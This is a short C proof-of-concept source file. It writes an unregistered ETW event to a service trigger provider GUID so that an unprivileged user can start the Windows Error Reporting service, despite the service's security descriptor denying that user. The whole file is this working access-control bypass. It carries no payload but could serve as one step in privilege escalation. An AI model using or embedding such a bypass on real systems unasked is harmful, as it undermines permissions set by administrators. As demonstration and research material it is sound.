# simple demonstration code allowing regular user to launch wersvc despite having it denied in the service security descriptor
# fully working and harmless

#include <Windows.h>
#include <winternl.h>
#include <securitybaseapi.h>
#include <evntprov.h>
#include <stdio.h>
#include <evntcons.h>

HANDLE hModule; //handle to ntdll 

typedef ULONG(__stdcall* Etw_Event_Write_No_Registration)(_In_ LPCGUID ProviderId, _In_ PCEVENT_DESCRIPTOR EventDescriptor, _In_ ULONG UserDataCount, _In_reads_opt_(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData);
Etw_Event_Write_No_Registration EtwEventWriteNoRegistrationStruct; //to call dynamically loaded EtwEventWriteNoRegistration

LONG
WINAPI
WriteWerEtw()
{
	static const GUID FeedbackServiceTriggerProviderGuid = {0xe46eead8, 0xc54, 0x4489, {0x98, 0x98, 0x8f, 0xa7, 0x9d, 0x5, 0x9e, 0xe}};

	NTSTATUS NtStatus;
	EVENT_DESCRIPTOR EventDescriptor;

	RtlZeroMemory(&EventDescriptor, sizeof(EVENT_DESCRIPTOR));

	NtStatus = EtwEventWriteNoRegistrationStruct(&FeedbackServiceTriggerProviderGuid,
		&EventDescriptor,
		0,
		NULL);

	return (LONG)NtStatus;
}


int wmain()
{
	hModule = LoadLibrary(L"ntdll.dll");
	if (hModule == NULL)
	{
		printf("Error: could not load ntdll.dll.");
		exit(-1);
	}

	EtwEventWriteNoRegistrationStruct = (Etw_Event_Write_No_Registration)GetProcAddress(hModule, "EtwEventWriteNoRegistration");
	if (EtwEventWriteNoRegistrationStruct == NULL)
	{
		printf("Error: could not find the function EtwEventWriteNoRegistration in library ntdll.dll.");
		exit(-1);
	}
    
	return WriteWerEtw();

}
